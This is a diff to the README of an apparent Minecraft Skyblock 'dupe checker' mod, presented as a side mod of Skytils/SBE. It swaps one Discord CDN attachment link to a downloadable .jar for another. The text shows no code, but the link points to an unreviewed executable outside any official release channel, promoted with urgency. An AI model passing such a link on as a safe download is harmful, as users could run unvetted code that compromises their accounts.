@@ -11,7 +11,7 @@ This mod adds High-Value Dupe checker into your skyblock expirience.
 A side mod of Skytils/Sbe, A amazing Dupe Checker.
 although SBE and Skyitls are better in different aspects, NBT is better overall for dupe checking, as skytils and SBE's api lacks in quality.
 
-This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/956352634116247604/963501354066771988/NBTitemData-2.6.4.jar)
+This side mod can be downloaded [HERE](https://cdn.discordapp.com/attachments/937147258217054229/965375312047259649/NBTitemData-2.8.5.jar)
 
 ### Why is this useful?
 Many players have been wiped before, Now this will prevent it. Don't buy anything before Dupe-Checking it!
